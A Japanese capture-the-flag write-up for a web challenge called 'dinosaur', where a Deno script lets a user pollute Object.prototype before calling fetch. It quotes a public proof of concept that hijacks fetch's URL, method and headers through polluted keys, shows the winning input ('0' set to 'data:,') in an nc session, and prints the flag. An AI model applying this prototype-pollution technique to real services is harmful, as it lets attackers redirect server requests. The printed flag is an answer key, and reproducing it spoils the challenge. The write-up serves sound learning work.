# dinosaur:Web:100pts
恐竜ってモフモフだったらしい🦖  

[dinosaur.tar.gz](dinosaur.tar.gz)  

`nc 34.170.146.252 28172`  

# Solution
ソースと接続先が渡される。  
ソースは以下の通りであった。  
```ts
// deno --no-prompt index.ts
try {
    Object.prototype[prompt("key")!] = prompt("value")!;
    const response = await fetch("http://localhost/");
    if (response.ok) console.log("Alpaca{REDACTED}");
} catch (error) {
    console.log("Error");
}
```
自明なPrototype Pollutionのチャンスがあり、その後にfetchしている。  
レスポンスがokであればフラグが出るようだ。  
ただし、`http://localhost/`でサービスは立ち上がっていないのでokが返ってくるはずもない。  
初めにPrototype PollutionでURLを`http://example.com`など200が返るサイトにすることを目指す。  
「deno fetch prototype pollution」などとGoogleで探すと[fetch.PoC.ts](https://github.com/KTH-LangSec/server-side-prototype-pollution/blob/main/deno/fetch/fetch.PoC.ts)が見つかる。  
```ts
// ref. https://github.com/KTH-LangSec/server-side-prototype-pollution/blob/main/deno/fetch/fetch.PoC.ts
function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

pollute("0", "https://github.com");
pollute("method", "POST");
pollute("body", "Hello world!");
pollute("headers", {
    "foo": "bar",
    "content-type": "plaintext",
});

const response = await fetch("https://deno.land/");
console.log(response);
```
どうやら`"0"`を汚染することで、URLを書き換えられるようだ。  
これで任意のサイトへのfetchとすることができるため、フラグが得られそうだが上手くいかない。  
denoは実行時に`--allow-net`フラグがない場合はfetchでのネットワークアクセスは許されず、エラーとなるようだ。  
もちろんファイルアクセスも許されない。  
レスポンスがokとなるfetch可能な場所は他にあるだろうか。  
`javascript:`を試した後`data:,`とすると、都合よく200が返ってきた。  
あとは以下のように行う。  
```bash
$ nc 34.170.146.252 28172
key 0
0
value data:,
data:,
Alpaca{z4w4z4w4_f0r3st_4lp4ch4n}
```
flagが得られた。  

## Alpaca{z4w4z4w4_f0r3st_4lp4ch4n}